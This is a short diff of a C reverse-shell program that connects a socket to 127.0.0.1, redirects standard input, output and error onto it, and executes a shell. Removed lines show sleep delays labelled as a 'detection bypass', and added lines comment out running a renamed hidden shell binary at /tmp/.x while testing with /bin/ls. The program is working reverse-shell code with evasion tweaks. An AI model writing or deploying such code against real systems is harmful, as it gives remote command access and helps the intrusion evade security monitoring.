@@ -2,6 +2,7 @@
 #include <unistd.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <stdlib.h>
 
 int main() {
     int sock;
@@ -13,17 +14,16 @@ int main() {
     inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);
 
     connect(sock, (struct sockaddr*)&server, sizeof(server));
-    sleep(2); // delay before dup2
 
     dup2(sock, 0);
-    sleep(1);
     dup2(sock, 1);
-    sleep(1);
     dup2(sock, 2);
 
-    sleep(8); // delay before execve  {this is the point detection bypass}
-    char *args[] = {"/bin/sh", NULL};
-    execve("/bin/sh", args, NULL);
+    // renamed shell binary (you must create this manually) but for test we use `ls`
+    //char *args[] = {"/tmp/.x", NULL};
+    //execve("/tmp/.x", args, NULL);
+
+    execve("/bin/ls", NULL, NULL);
 
     return 0;
 }
